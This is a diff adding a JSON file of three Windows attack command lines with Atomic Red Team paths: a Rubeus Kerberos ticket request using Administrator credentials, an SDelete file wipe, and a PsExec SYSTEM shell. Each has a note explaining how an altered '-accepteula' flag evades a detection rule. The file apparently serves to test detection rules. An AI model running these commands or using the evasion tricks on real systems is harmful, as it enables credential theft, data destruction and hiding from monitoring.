@@ -1,0 +1,14 @@
+[
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe\" -accepteula=true \\\\localhost -w c:\\ -c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\rubeus.exe asktgt /user:Administrator /password:Password /domain:THAIMX /outfile:ticket.kirbi",
+    "explanation": "Substitution technique: Replaces the plain flag string with an assignment structure ('-accepteula=true'). Sysinternals binaries accept assignments using an equals sign, which allows the command to execute smoothly while evading the rule's specific ' -accepteula' trailing-space token check."
+  },
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\Sdelete\\sdelete.exe\" \"-accepteula\" C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1485.txt",
+    "explanation": "Insertion technique: Wraps the target flag in standalone double quotes ('\"-accepteula\"'). This injects quote delimiters into the string literal captured by logging telemetry, breaking the contiguous matching pattern while remaining completely valid for the executable."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Users\\Public\\Temp\\PsExec.exe\" -i -s cmd -accept^eula",
+    "explanation": "Insertion technique: Injects the command-line interpreter caret escape symbol ('^') inside the flag parameter string. This modifies the raw text signature captured in process logs while the command interpreter normalizes the argument perfectly before application invocation."
+  }
+]
